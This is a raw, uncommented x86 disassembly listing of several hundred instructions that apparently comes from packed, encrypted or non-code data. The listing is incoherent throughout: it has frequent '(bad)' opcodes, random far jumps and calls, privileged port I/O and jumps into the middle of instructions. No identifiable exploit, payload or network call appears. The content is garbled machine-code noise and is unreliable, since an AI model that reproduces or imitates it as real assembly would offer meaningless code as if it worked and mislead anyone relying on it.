  41e6f7:	jmp    0x7557:0x152e2beb
  41e6fe:	arpl   sp,bp
  41e700:	sti    
  41e701:	call   0xd05a11c6
  41e706:	mov    esp,0xe0f38f2b
  41e70b:	clc    
  41e70c:	outs   dx,BYTE PTR ds:[esi]
  41e70d:	xchg   esi,eax
  41e70e:	cmp    DWORD PTR [ecx+0x12],0xffffffab
  41e712:	imul   esi,DWORD PTR [esi-0x48],0x2bf48dc6
  41e719:	cmp    eax,0xd0cd307e
  41e71e:	xor    al,0xb3
  41e720:	ss pop ss
  41e722:	inc    edi
  41e723:	lea    esi,[ebp+0x25]
  41e726:	out    0x84,eax
  41e728:	not    DWORD PTR [edi+0x614ef5dc]
  41e72e:	mov    ebp,0x6db09c67
  41e733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e734:	dec    ebx
  41e735:	or     DWORD PTR [eax+esi*1],0x61656917
  41e73c:	dec    edi
  41e73d:	loope  0x41e79b
  41e73f:	mov    ebp,0x125064c6
  41e744:	or     BYTE PTR [edx-0x4c0c94a1],cl
  41e74a:	pop    edi
  41e74b:	jnp    0x41e78e
  41e74d:	and    BYTE PTR [ecx+ebp*4+0x566d85bc],ah
  41e754:	ins    DWORD PTR es:[edi],dx
  41e755:	or     al,0xb8
  41e757:	jecxz  0x41e74e
  41e759:	lods   al,BYTE PTR ds:[esi]
  41e75a:	lods   eax,DWORD PTR ds:[esi]
  41e75b:	loopne 0x41e7b5
  41e75d:	jne    0x41e71f
  41e75f:	retf   0xff38
  41e762:	or     eax,0xaff66fdd
  41e767:	mov    ds:0x6ff0285d,al
  41e76c:	xchg   edx,eax
  41e76d:	into   
  41e76e:	and    DWORD PTR [ebx-0x62],eax
  41e771:	in     eax,0x14
  41e773:	call   0x14b84222
  41e778:	(bad)  
  41e779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e77a:	push   es
  41e77b:	mov    ebp,0x2bfe01dc
  41e780:	test   DWORD PTR [ecx+0x3ec12559],ebx
  41e786:	adc    ebx,edi
  41e788:	ds loope 0x41e70f
  41e78b:	test   BYTE PTR [eax-0x64],0x42
  41e78f:	ds ss add al,0xc0
  41e793:	mov    al,ds:0xf29f000a
  41e798:	mov    ds:0x825d4efa,eax
  41e79d:	mul    DWORD PTR [ebp-0x50]
  41e7a0:	dec    ebp
  41e7a1:	add    DWORD PTR [ecx],ebp
  41e7a3:	out    0x28,al
  41e7a5:	add    BYTE PTR [ecx-0x442a8dcf],ch
  41e7ab:	aas    
  41e7ac:	cwde   
  41e7ad:	mov    ebp,0x9719ed77
  41e7b2:	and    esp,DWORD PTR [esi+0x6b]
  41e7b5:	or     BYTE PTR [ebx+0x61],dh
  41e7b8:	idiv   BYTE PTR [edx-0x5c]
  41e7bb:	stc    
  41e7bc:	retf   0xc160
  41e7bf:	into   
  41e7c0:	pop    ebp
  41e7c1:	neg    BYTE PTR [eax+0x13f44967]
  41e7c7:	push   edx
  41e7c8:	in     al,0xc
  41e7ca:	mov    cs,WORD PTR [eax-0x41]
  41e7cd:	mov    ?,WORD PTR [edx-0x8]
  41e7d0:	lahf   
  41e7d1:	sbb    ch,0x9d
  41e7d4:	jae    0x41e7e9
  41e7d6:	in     eax,dx
  41e7d7:	cmp    eax,0xb4f95c71
  41e7dc:	cwde   
  41e7dd:	xchg   ebx,eax
  41e7de:	mov    al,0x2b
  41e7e0:	fs je  0x41e774
  41e7e3:	dec    edx
  41e7e4:	dec    eax
  41e7e5:	fst    DWORD PTR [ebx+0x71b48f2]
  41e7eb:	inc    edx
  41e7ec:	aam    0xbe
  41e7ee:	mov    ebx,0xfbf3c39f
  41e7f3:	popa   
  41e7f4:	shr    BYTE PTR [ebx+ebx*1-0x23],0x86
  41e7f9:	cmp    eax,0x68ba2f7d
  41e7fe:	out    dx,eax
  41e7ff:	jno    0x41e7ab
  41e801:	test   al,0xfa
  41e803:	mov    edx,0xd08276da
  41e808:	mov    eax,ds:0x6232e834
  41e80d:	xor    DWORD PTR [ecx+0x1a],0xffffff9c
  41e811:	jp     0x41e7c0
  41e813:	movntq (bad),mm1
  41e814:	out    0xc9,eax
  41e816:	hlt    
  41e817:	xor    esi,DWORD PTR [ebx-0x63]
  41e81a:	mov    eax,0xd4adb68a
  41e81f:	loopne 0x41e7b9
  41e821:	inc    esi
  41e822:	lock add ebp,edx
  41e825:	leave  
  41e826:	jmp    0x74d7:0xafe9eef7
  41e82d:	cmp    edx,0xdac22a19
  41e833:	xchg   ecx,eax
  41e834:	imul   ebx,DWORD PTR [edi],0xffffff89
  41e837:	sub    ecx,DWORD PTR [ebp+0x5fa488e9]
  41e83d:	leave  
  41e83e:	jecxz  0x41e85c
  41e840:	or     DWORD PTR [edx+0x44],0xffffffcb
  41e844:	xor    BYTE PTR [eax+0x4532083d],al
  41e84a:	mov    ds:0xed80ba2,eax
  41e84f:	sbb    dh,bh
  41e851:	popa   
  41e852:	inc    ecx
  41e853:	scas   al,BYTE PTR es:[edi]
  41e854:	add    eax,DWORD PTR [ebx+0x42748b2e]
  41e85a:	pop    ds
  41e85b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e85c:	jbe    0x41e877
  41e85e:	(bad)  
  41e85f:	fisubr WORD PTR [eax-0x1]
  41e862:	bound  ecx,QWORD PTR [ebx-0x36]
  41e865:	adc    DWORD PTR [ebx+edi*4+0x76],esp
  41e869:	repz enter 0x32c6,0x37
  41e86e:	inc    edx
  41e86f:	xlat   BYTE PTR ds:[ebx]
  41e870:	cmp    eax,0xdbdb94f3
  41e875:	sbb    BYTE PTR [edi],al
  41e877:	push   eax
  41e878:	push   ebx
  41e879:	inc    ebx
  41e87a:	fsub   st,st(5)
  41e87c:	sbb    edx,DWORD PTR [ebp-0x5fdf45ab]
  41e882:	xor    eax,0xb9386628
  41e887:	rol    DWORD PTR ds:0x7cdcf65,0xeb
  41e88e:	cmp    esi,DWORD PTR [eax-0x7fe90657]
  41e894:	loope  0x41e8af
  41e896:	and    bh,dl
  41e898:	je     0x41e88f
  41e89a:	ror    ebx,1
  41e89c:	ja     0x41e869
  41e89e:	dec    ecx
  41e89f:	test   edx,esi
  41e8a1:	out    0x20,eax
  41e8a3:	adc    DWORD PTR [esi-0x6114bfa8],esp
  41e8a9:	or     DWORD PTR [ebx+0x7e092b1b],edx
  41e8af:	(bad)  
  41e8b0:	ins    BYTE PTR es:[edi],dx
  41e8b1:	fisub  WORD PTR [ebx+0x63]
  41e8b4:	jmp    0xbce2b773
  41e8b9:	ins    BYTE PTR es:[edi],dx
  41e8ba:	adc    al,0xc8
  41e8bc:	scas   eax,DWORD PTR es:[edi]
  41e8bd:	adc    ebp,DWORD PTR [eax+0x63a79316]
  41e8c3:	ret    0x6ab6
  41e8c6:	dec    ebx
  41e8c7:	sub    cl,ch
  41e8c9:	jmp    0x41e8c0
  41e8cb:	addr16 pop esp
  41e8cd:	cmc    
  41e8ce:	(bad)
  41e8d2:	(bad)  
  41e8d3:	xor    eax,DWORD PTR [edi-0x3c]
  41e8d6:	dec    edi
  41e8d7:	and    eax,0x5f6eb17b
  41e8dc:	pushw  es
  41e8de:	jp     0x41e8e0
  41e8e0:	sub    BYTE PTR [eax-0x3e043266],dl
  41e8e6:	aaa    
  41e8e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8e8:	inc    eax
  41e8e9:	sub    al,0x49
  41e8eb:	popf   
  41e8ec:	push   0xa0429ca1
  41e8f1:	jp     0x41e89e
  41e8f3:	sti    
  41e8f4:	sbb    DWORD PTR [eax-0x5b211ef9],esi
  41e8fa:	sbb    ch,BYTE PTR [eax+0x3d]
  41e8fd:	data16 data16 fidiv WORD PTR [ecx-0x1c17fa0d]
  41e905:	mov    edi,0xebc8ecc5
  41e90a:	adc    BYTE PTR [edi],ah
  41e90c:	in     al,0x9d
  41e90e:	ss or  eax,0x3415b12a
  41e914:	or     DWORD PTR [ebp-0x4c81bb50],ebp
  41e91a:	jno    0x41e980
  41e91c:	out    dx,al
  41e91d:	jns    0x41e8fe
  41e91f:	push   esi
  41e920:	pop    eax
  41e921:	stos   DWORD PTR es:[edi],eax
  41e922:	jmp    0x41e998
  41e924:	rcl    eax,cl
  41e926:	mov    al,ds:0xe6604dd9
  41e92b:	inc    edx
  41e92c:	int    0xbe
  41e92e:	add    DWORD PTR [ebp-0xe1f3d8f],esi
  41e934:	pop    edi
  41e935:	cmp    eax,0x7928edc8
  41e93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e93c:	mov    eax,ds:0xa0607ec4
  41e941:	xor    ebp,DWORD PTR [bx]
  41e944:	adc    ebp,edi
  41e946:	inc    eax
  41e947:	sub    ebp,0x6a
  41e94a:	pop    ecx
  41e94b:	dec    esp
  41e94c:	mov    ecx,0x78f5a85
  41e951:	(bad)  
  41e952:	cs fwait
  41e954:	outs   dx,BYTE PTR ds:[esi]
  41e955:	add    dh,BYTE PTR [eax+0x52]
  41e958:	sahf   
  41e959:	mov    edx,0x15ea1960
  41e95e:	pushf  
  41e95f:	shl    DWORD PTR [ecx],0xe9
  41e962:	inc    eax
  41e963:	jno    0x41e9d1
  41e965:	test   BYTE PTR [edx-0x666e8ae1],ch
  41e96b:	xor    al,0xd
  41e96d:	shl    DWORD PTR [ebx+ecx*8],0xc6
  41e971:	(bad)  
  41e972:	stos   DWORD PTR es:[edi],eax
  41e973:	(bad)  
  41e975:	loopne 0x41e94d
  41e977:	fnstcw WORD PTR [ecx+0x20d42f3e]
  41e97d:	inc    esi
  41e97e:	pop    ebp
  41e97f:	hlt    
  41e980:	pushf  
  41e981:	jno    0x41e982
  41e983:	in     eax,dx
  41e984:	lock push edx
  41e986:	push   cs
  41e987:	(bad)  
  41e988:	pop    eax
  41e989:	out    dx,eax
  41e98a:	cdq    
  41e98b:	stos   DWORD PTR es:[edi],eax
  41e98c:	jge    0x41e965
  41e98e:	jns    0x41e9a4
  41e990:	es popa 
  41e992:	fdiv   DWORD PTR [ebx+0x34455b35]
  41e998:	int3   
  41e999:	jg     0x41ea0c
  41e99b:	xchg   esp,eax
  41e99c:	pop    esi
  41e99d:	imul   esp,DWORD PTR [eax],0x1a9c400a
  41e9a3:	outs   dx,BYTE PTR ds:[esi]
  41e9a4:	ss jle 0x41e982
  41e9a7:	xchg   edx,eax
  41e9a8:	dec    ecx
  41e9a9:	stos   BYTE PTR es:[edi],al
  41e9aa:	inc    edi
  41e9ab:	retf   0x6e41
  41e9ae:	mov    edx,0x47dd841c
  41e9b3:	mov    gs,WORD PTR [edx+0x535cedd4]
  41e9b9:	inc    edi
  41e9ba:	xchg   BYTE PTR [ecx-0x75],ch
  41e9bd:	shl    DWORD PTR [esi+0x4e],1
  41e9c0:	xor    edi,DWORD PTR [edi]
  41e9c2:	or     dh,bh
  41e9c4:	or     DWORD PTR [ebx-0x6d820a94],0xc6c72fd7
  41e9ce:	xor    bl,BYTE PTR ds:0x8ca345f9
  41e9d5:	fcomp  QWORD PTR [ecx]
  41e9d7:	out    0x4d,al
  41e9d9:	push   edx
  41e9da:	inc    esi
  41e9db:	fs je  0x41ea1e
  41e9de:	dec    ebp
  41e9df:	adc    DWORD PTR [ebx],esp
  41e9e1:	cmp    al,BYTE PTR [edi-0x31]
  41e9e4:	mov    al,0x45
  41e9e6:	int    0x16
  41e9e8:	fldcw  WORD PTR [ecx]
  41e9ea:	and    BYTE PTR [ebp+esi*8-0xb2e3ef3],cl
  41e9f1:	scas   eax,DWORD PTR es:[edi]
  41e9f2:	dec    esi
  41e9f3:	stos   BYTE PTR es:[edi],al
  41e9f4:	jbe    0x41e97b
  41e9f6:	dec    esi
  41e9f7:	loop   0x41e989
  41e9f9:	jbe    0x41e9b3
  41e9fb:	xlat   BYTE PTR ds:[ebx]
  41e9fc:	pop    ecx
  41e9fe:	pushf  
  41e9ff:	sub    al,0x27
  41ea01:	inc    eax
  41ea02:	xchg   esi,eax
  41ea03:	sbb    BYTE PTR ds:0x47fddedc,0x40
  41ea0a:	xchg   ecx,eax
  41ea0b:	adc    ecx,DWORD PTR [edi-0x693c067d]
  41ea11:	inc    esi
  41ea12:	mov    esi,0x179d101
  41ea17:	or     dh,ch
  41ea19:	ins    BYTE PTR es:[edi],dx
  41ea1a:	cli    
  41ea1b:	push   0x5762b028
  41ea20:	je     0x41eaa0
  41ea22:	cmp    DWORD PTR [ecx-0x2b],edx
  41ea25:	cmp    edi,DWORD PTR [eax+0x681c768b]
  41ea2b:	and    eax,ebx
  41ea2d:	cmp    BYTE PTR [edi],bl
  41ea2f:	sbb    al,0xc2
  41ea31:	or     ah,BYTE PTR [esi]
  41ea33:	dec    edx
  41ea34:	xlat   BYTE PTR ds:[ebx]
  41ea35:	push   edx
  41ea36:	dec    ebp
  41ea37:	scas   al,BYTE PTR es:[edi]
  41ea38:	fwait
  41ea39:	mov    dl,0x2e
  41ea3b:	sbb    dh,ah
  41ea3d:	mul    BYTE PTR [edi*4-0x3e687874]
  41ea44:	retf   0x74f0
  41ea47:	or     BYTE PTR [eax],bh
  41ea49:	pop    esi
  41ea4a:	in     al,0xa5
  41ea4c:	clc    
  41ea4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea4e:	jae    0x41ea77
  41ea50:	push   ds
  41ea51:	pop    esi
  41ea52:	repnz cmc 
  41ea54:	repnz mul al
  41ea57:	xchg   DWORD PTR [edi-0x2faf84fc],ebx
  41ea5d:	dec    ecx
  41ea5e:	loope  0x41ea2a
  41ea60:	cmp    DWORD PTR [edi-0x333251fe],edx
  41ea66:	popa   
  41ea67:	mov    ah,0x1
  41ea69:	loopne 0x41eade
  41ea6b:	dec    ecx
  41ea6c:	jbe    0x41eab1
  41ea6e:	pushf  
  41ea6f:	mov    esp,0x76097cd7
  41ea74:	jae    0x41ea45
  41ea76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea77:	push   ebx
  41ea78:	fld    DWORD PTR [ebp-0x7d7efa78]
  41ea7e:	arpl   WORD PTR [eax],sp
  41ea80:	xor    BYTE PTR [ebp+0x13c68f5c],0x32
  41ea87:	aam    0xb9
  41ea89:	xchg   BYTE PTR [ebx],ch
  41ea8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea8c:	xor    al,0x8a
  41ea8e:	enter  0x58b7,0xab
  41ea92:	jb     0x41eb12
  41ea94:	sahf   
  41ea95:	inc    esi
  41ea96:	mov    bl,0xc9
  41ea98:	popf   
  41ea99:	nop
  41ea9a:	fisub  WORD PTR [eax+0xa77048b]
  41eaa0:	add    al,0x22
  41eaa2:	cmp    bl,BYTE PTR [ebx]
  41eaa4:	shl    BYTE PTR [ebp+0x4d5a570b],0xaf
  41eaab:	mov    eax,ds:0x473b2656
  41eab0:	mov    BYTE PTR [edi],bl
  41eab2:	lea    esi,[ebx]
  41eab4:	mov    ch,0xd6
  41eab6:	or     ch,ch
  41eab8:	adc    BYTE PTR [esi+0x64],0x7f
  41eabc:	mov    al,ds:0x490031d
  41eac1:	add    eax,0x13ca293d
  41eac6:	adc    BYTE PTR [ecx-0x55c98801],dh
  41eacc:	adc    BYTE PTR [edi+0x57],bl
  41eacf:	shl    BYTE PTR [esi-0x4552a2fb],cl
  41ead5:	mov    dl,0x76
  41ead7:	out    dx,eax
  41ead8:	call   0x1efa:0x4432655a
  41eadf:	stos   DWORD PTR es:[edi],eax
  41eae0:	adc    edi,DWORD PTR [edi+0xf]
  41eae3:	scas   eax,DWORD PTR es:[edi]
  41eae4:	pop    ebx
  41eae5:	in     al,dx
  41eae6:	add    BYTE PTR [ebx],cl
  41eae8:	sub    al,0xd1
  41eaea:	enter  0x16bc,0x9e
  41eaee:	arpl   WORD PTR [eax-0x58],di
  41eaf1:	dec    esi
  41eaf2:	add    eax,0x3c38cd35
  41eaf7:	xor    eax,0x2547fb64
  41eafc:	cwde   
  41eafd:	mov    WORD PTR ss:[edx-0x4f2acb50],ss
  41eb04:	fadd   DWORD PTR fs:[esi-0x16]
  41eb08:	mov    eax,0x22d205d7
  41eb0d:	call   0x8964ad56
  41eb12:	xchg   BYTE PTR cs:[eax+0x5cd42f30],al
  41eb19:	mul    BYTE PTR [edi+0x45]
  41eb1c:	scas   eax,DWORD PTR es:[edi]
  41eb1d:	outs   dx,BYTE PTR ds:[esi]
  41eb1e:	jge    0x41eb1a
  41eb20:	(bad)  
  41eb21:	dec    ebp
  41eb22:	scas   eax,DWORD PTR es:[edi]
  41eb23:	in     al,0x1a
  41eb25:	push   es
  41eb26:	faddp  st(2),st
  41eb28:	or     eax,DWORD PTR [ecx+0x38]
  41eb2b:	lea    eax,[ebp-0x2a]
  41eb2e:	dec    ecx
  41eb2f:	call   0x4ee0b634
  41eb34:	enter  0xc793,0xba
  41eb38:	dec    ecx
  41eb39:	cmc    
  41eb3a:	sub    edx,ecx
  41eb3c:	iret   
  41eb3d:	mov    ds,WORD PTR [esi]
  41eb3f:	xchg   esp,eax
  41eb40:	imul   esp,ebx,0x5c7b60fe
  41eb46:	cmp    BYTE PTR [esi+0x30],bh
  41eb49:	scas   eax,DWORD PTR es:[edi]
  41eb4a:	mov    esi,0xe2e791d7
  41eb4f:	ins    DWORD PTR es:[edi],dx
  41eb50:	mov    ch,0x44
  41eb52:	(bad)  
  41eb53:	ds jmp 0x41eb5a
  41eb56:	pop    ebx
  41eb57:	test   al,0xa
  41eb59:	lods   al,BYTE PTR ds:[esi]
  41eb5a:	jnp    0x41eb07
  41eb5c:	cmp    eax,0x4a09ab6f
  41eb61:	test   al,0x46
  41eb63:	cmp    DWORD PTR [ecx-0x42],ebx
  41eb66:	mov    bh,0xd0
  41eb68:	dec    edx
  41eb69:	pop    edi
  41eb6b:	ins    BYTE PTR es:[edi],dx
  41eb6c:	imul   ebx,DWORD PTR [edx],0x608ff1
  41eb72:	add    ch,BYTE PTR ss:[ebp-0x40]
  41eb76:	cmp    eax,0xf9489924
  41eb7b:	cmc    
  41eb7c:	xchg   esp,eax
  41eb7d:	xor    eax,0x12c32858
  41eb82:	dec    ebp
  41eb83:	adc    eax,0x1fb876c4
  41eb88:	(bad)  
  41eb89:	retf   
  41eb8a:	add    esi,DWORD PTR [eax-0xf]
  41eb8d:	mov    ebp,0xa7f14bd5
  41eb92:	sbb    eax,0x3ee5cd88
  41eb97:	xor    al,0xf7
  41eb99:	daa    
  41eb9a:	jl     0x41eb73
  41eb9c:	daa    
  41eb9d:	cwde   
  41eb9e:	adc    DWORD PTR [eax+ebx*2+0x49c52159],edx
  41eba5:	xor    esi,0xdeb01d46
  41ebab:	popf   
  41ebac:	loope  0x41ec15
  41ebae:	pop    esp
  41ebaf:	add    al,ah
  41ebb1:	ret    0xb7e6
  41ebb4:	lahf   
  41ebb5:	icebp  
  41ebb6:	sti    
  41ebb7:	adc    al,0x98
  41ebb9:	clc    
  41ebba:	imul   ebp,DWORD PTR [edi],0x69
  41ebbd:	cmp    esp,DWORD PTR [ebx]
  41ebbf:	pop    edi
  41ebc0:	sbb    DWORD PTR [edx],edi
  41ebc2:	je     0x41ec2d
  41ebc4:	adc    eax,0x8578a5c2
  41ebc9:	call   0x128be172
  41ebce:	jmp    0x7a31:0x5ff33fd1
  41ebd5:	or     edi,esp
  41ebd7:	pop    ebx
  41ebd8:	mov    ds:0xf8630cc0,al
  41ebdd:	lods   eax,DWORD PTR ds:[esi]
  41ebde:	xor    esi,ebp
  41ebe0:	pop    ebp
  41ebe1:	jg     0x41ec27
  41ebe3:	lea    eax,[edi+0x507115ff]
  41ebe9:	dec    esi
  41ebea:	fst    DWORD PTR [esi]
  41ebec:	pop    edi
  41ebed:	mov    bl,0x1d
  41ebef:	hlt    
  41ebf0:	pop    es
  41ebf1:	mov    ebx,0x414c3ae6
  41ebf6:	sbb    al,0x6c
  41ebf8:	loopne 0x41eb7c
  41ebfa:	into   
  41ebfb:	ss inc ebp
  41ebfd:	and    al,0x21
  41ebff:	cs (bad) 
  41ec01:	xlat   BYTE PTR ds:[ebx]
  41ec02:	jg     0x41ebbc
  41ec04:	fwait
  41ec05:	cli    
  41ec06:	in     al,dx
  41ec07:	mov    ds:0x13eee996,eax
  41ec0c:	dec    edi
  41ec0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec0e:	sub    ebp,DWORD PTR [edi+0x50151e3a]
  41ec14:	inc    esi
  41ec15:	dec    ecx
  41ec16:	add    BYTE PTR [esi+0x10541df5],bl
  41ec1c:	fdiv   st(6),st
  41ec1e:	inc    eax
  41ec1f:	ret    0xfe0e
  41ec22:	test   al,0x58
  41ec24:	and    ebp,ecx
  41ec26:	xchg   ecx,eax
  41ec27:	inc    edx
  41ec28:	mov    eax,ds:0x9dab76f9
  41ec2d:	aad    0x1b
  41ec2f:	ss data16 fcmovnu st,st(1)
  41ec33:	jb     0x41ebd2
  41ec35:	sbb    bh,0xac
  41ec38:	ret    
  41ec39:	pop    es
  41ec3a:	mov    ebp,0x7d5a1f97
  41ec3f:	inc    edx
  41ec40:	(bad)  
  41ec41:	jmp    0xfb0269ad
  41ec46:	xor    al,0x99
  41ec48:	mul    DWORD PTR [edx+edi*1]
  41ec4b:	inc    eax
  41ec4c:	add    ebp,DWORD PTR ss:[ecx-0x53]
  41ec50:	out    dx,eax
  41ec51:	push   esi
  41ec52:	dec    ecx
  41ec53:	fsub   QWORD PTR [edi+ebp*8+0x24]
  41ec57:	sti    
  41ec58:	js     0x41ec2d
  41ec5a:	cmp    al,0xbc
  41ec5c:	sbb    dh,BYTE PTR [edx-0x1]
  41ec5f:	jmp    0xe02830b7
  41ec64:	fnstsw WORD PTR ds:0x751513d8
  41ec6a:	and    DWORD PTR [esi-0x1f],ebp
  41ec6d:	pop    ecx
  41ec6e:	xchg   ebx,eax
  41ec6f:	push   0xd5e0344a
  41ec74:	dec    eax
  41ec75:	lods   al,BYTE PTR ds:[esi]
  41ec76:	cld    
  41ec77:	inc    esi
  41ec78:	mov    BYTE PTR [ebx],0xdb
  41ec7b:	(bad)  
  41ec7c:	in     al,0x99
  41ec7e:	xchg   edi,eax
  41ec7f:	fild   DWORD PTR [ebx]
  41ec81:	jle    0x41ec7a
  41ec83:	pop    edx
  41ec84:	sbb    ecx,edi
  41ec86:	les    ecx,FWORD PTR [edi+0x37]
  41ec89:	ins    DWORD PTR es:[edi],dx
  41ec8a:	xor    al,0xfc
  41ec8c:	test   eax,0x9579216d
  41ec91:	sub    ecx,ecx
  41ec93:	xor    DWORD PTR [esi+edi*2],eax
  41ec96:	or     DWORD PTR [edi],ecx
  41ec98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec99:	ret    
  41ec9a:	xchg   esp,eax
  41ec9b:	sub    eax,0x75776d6c
  41eca0:	(bad)  
  41eca1:	mov    dh,cl
  41eca3:	adc    al,0x79
  41eca5:	ret    
  41eca6:	in     eax,dx
  41eca7:	sub    esi,DWORD PTR [ecx-0x21]
  41ecaa:	mov    edx,DWORD PTR [ecx-0x47]
  41ecad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecae:	dec    edi
  41ecaf:	sub    al,0x75
  41ecb1:	(bad)  
  41ecb2:	fsub   QWORD PTR [ebx]
  41ecb4:	shl    BYTE PTR [eax-0x6846e7f6],cl
  41ecba:	sub    BYTE PTR [ebp+0x70],dh
  41ecbd:	sbb    cl,bh
  41ecbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecc0:	jb     0x41ecb3
  41ecc2:	in     al,dx
  41ecc3:	nop    DWORD PTR [edi]
  41ecc6:	cld    
  41ecc7:	out    0x87,al
  41ecc9:	aad    0x5e
  41eccb:	xor    BYTE PTR [ecx+0x25],bl
  41ecce:	leave  
  41eccf:	aad    0x5
  41ecd1:	pop    eax
  41ecd2:	mov    ss,WORD PTR [ebp-0x77666fd6]
  41ecd8:	js     0x41ecd9
  41ecda:	mov    ch,0xd6
  41ecdc:	mov    esi,DWORD PTR [edx+edi*8+0x22]
  41ece0:	dec    ebx
  41ece1:	mov    esp,0xcc01cd18
  41ece6:	mov    ds:0xb16c1680,eax
  41eceb:	inc    esi
  41ecec:	push   cs
  41eced:	jecxz  0x41ecb5
  41ecef:	mov    ebp,0x7997c315
  41ecf4:	into   
  41ecf5:	scas   al,BYTE PTR es:[edi]
  41ecf6:	test   BYTE PTR [edi+eiz*8-0x4b],dh
  41ecfa:	(bad)  
  41ecfb:	imul   ebx,DWORD PTR [esi-0x4c],0xffffffde
  41ecff:	add    bh,ch
  41ed01:	sbb    DWORD PTR [ecx+ebp*4+0x4f],edi
  41ed05:	pop    DWORD PTR [edi+ebx*1+0x56e232c3]
  41ed0c:	aas    
  41ed0d:	or     eax,0x781ac62e
  41ed12:	jno    0x41ed2a
  41ed14:	rcr    BYTE PTR ds:0x9fb1c341,cl
  41ed1a:	mov    ds:0xe3cdbf39,eax
  41ed1f:	sbb    bh,BYTE PTR [eax+0x10]
  41ed22:	punpcklwd mm0,DWORD PTR es:[edx]
  41ed26:	icebp  
  41ed27:	push   eax
  41ed28:	pusha  
  41ed29:	lods   al,BYTE PTR ds:[esi]
  41ed2a:	cld    
  41ed2b:	shl    DWORD PTR [ebp-0x3264d760],cl
  41ed31:	imul   ebp,esi,0xed007d7e
  41ed37:	repnz push esi
  41ed39:	add    eax,0x5aba78e2
  41ed3e:	mov    edx,DWORD PTR [eax-0x539db618]
  41ed44:	push   0x73bcca2f
  41ed49:	leave  
  41ed4a:	sbb    ecx,edx
  41ed4c:	cwde   
  41ed4d:	jmp    0x41eda4
  41ed4f:	aad    0xe8
  41ed51:	add    esi,esi
  41ed53:	ja     0x41ed4d
  41ed55:	xchg   edx,eax
  41ed56:	js     0x41eda9
  41ed58:	xor    ch,bl
  41ed5a:	jae    0x41ed1b
  41ed5c:	sub    eax,0xe9fcbdc
  41ed61:	mov    eax,ds:0x9bd1a5a
  41ed66:	jge    0x41ed01
  41ed68:	out    0xae,eax
  41ed6a:	jg     0x41ecf9
  41ed6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed6d:	test   DWORD PTR [ebx],edi
  41ed6f:	dec    esp
  41ed70:	xchg   ecx,eax
  41ed71:	cmp    DWORD PTR ds:0x5d23901a,eax
  41ed77:	gs aas 
  41ed79:	data16 mov WORD PTR [edi-0x9357069],ds
  41ed80:	repz mov al,0x14
  41ed83:	add    ah,BYTE PTR [eax]
  41ed85:	inc    eax
  41ed86:	ds xchg ecx,eax
  41ed88:	dec    edx
  41ed89:	hlt    
  41ed8a:	ss jo  0x41eda9
  41ed8d:	pusha  
  41ed8e:	ret    0x4a86
  41ed91:	add    dl,BYTE PTR [edx+0x5697e23f]
  41ed97:	icebp  
  41ed98:	arpl   WORD PTR [edx],dx
  41ed9a:	mov    esp,0x92264432
  41ed9f:	jge    0x41edd6
  41eda1:	js     0x41ed75
  41eda3:	xlat   BYTE PTR ds:[ebx]
  41eda4:	scas   eax,DWORD PTR es:[edi]
  41eda5:	pop    ecx
  41eda6:	dec    esp
  41eda7:	inc    esp
  41eda8:	div    DWORD PTR [ebx+0x3b3bfa16]
  41edae:	and    DWORD PTR [ebp-0x68],eax
  41edb1:	add    BYTE PTR gs:[ebp-0x5],cl
  41edb5:	popf   
  41edb6:	dec    edx
  41edb7:	retf   0xb60a
  41edba:	push   ds
  41edbb:	dec    esp
  41edbc:	imul   edi,DWORD PTR [esi+0x1],0x2a9dee9
  41edc3:	retf   
  41edc4:	pop    esi
  41edc5:	call   0x3fd7af95
  41edca:	mov    ebp,0x2c6c3941
  41edcf:	adc    esp,esp
  41edd1:	ret    0xc389
  41edd4:	outs   dx,BYTE PTR ds:[esi]
  41edd5:	cmp    al,0xcf
  41edd7:	mov    ebx,0x31883489
  41eddc:	mov    ah,0xe4
  41edde:	sub    DWORD PTR [ecx+esi*2+0x5278ae7b],ebx
  41ede5:	loopne 0x41edb3
  41ede7:	xor    eax,0xee65287e
  41edec:	shl    BYTE PTR [ebx-0x79],cl
  41edef:	xor    DWORD PTR [esi],ecx
  41edf1:	jmp    0xa067:0xdd2edcc7
  41edf8:	loop   0x41ed7d
  41edfa:	mov    bh,0x8c
  41edfc:	imul   ecx,DWORD PTR [esi-0x2c],0xffffff8e
  41ee00:	xor    bl,al
  41ee02:	adc    DWORD PTR [ebx-0xd58685a],edx
  41ee08:	(bad)  
  41ee09:	and    DWORD PTR [ecx+eax*1],edx
  41ee0c:	outs   dx,DWORD PTR ds:[esi]
  41ee0d:	cmp    ch,BYTE PTR [edx+0x1e]
  41ee10:	xchg   ecx,eax
  41ee11:	xchg   ebx,eax
  41ee12:	lahf   
  41ee13:	(bad)  
  41ee14:	outs   dx,DWORD PTR ds:[esi]
  41ee15:	adc    eax,0x8d79632a
  41ee1a:	cmp    DWORD PTR [ecx],0x28
  41ee1d:	mov    ebp,DWORD PTR [ebx+0x792e0fcf]
  41ee23:	cmp    DWORD PTR [esi+0x668d126d],edx
  41ee29:	cmp    al,0xd8
  41ee2b:	mov    dh,0x90
  41ee2d:	push   ebp
  41ee2e:	rcl    esi,cl
  41ee30:	in     eax,0xc5
  41ee32:	dec    ebx
  41ee33:	cmp    al,0xc7
  41ee35:	inc    ebp
  41ee36:	arpl   WORD PTR [esp+eiz*4+0x5a],si
  41ee3a:	push   edi
  41ee3b:	push   ds
  41ee3c:	fsubp  st(7),st
  41ee3e:	(bad)  
  41ee3f:	add    BYTE PTR fs:[ebp+eiz*4-0x711cbde0],cl
  41ee47:	ret    0x1862
  41ee4a:	jg     0x41edd5
  41ee4c:	iret   
  41ee4d:	(bad)  
  41ee4e:	stos   BYTE PTR es:[edi],al
  41ee4f:	or     esp,edx
  41ee51:	outs   dx,BYTE PTR ds:[esi]
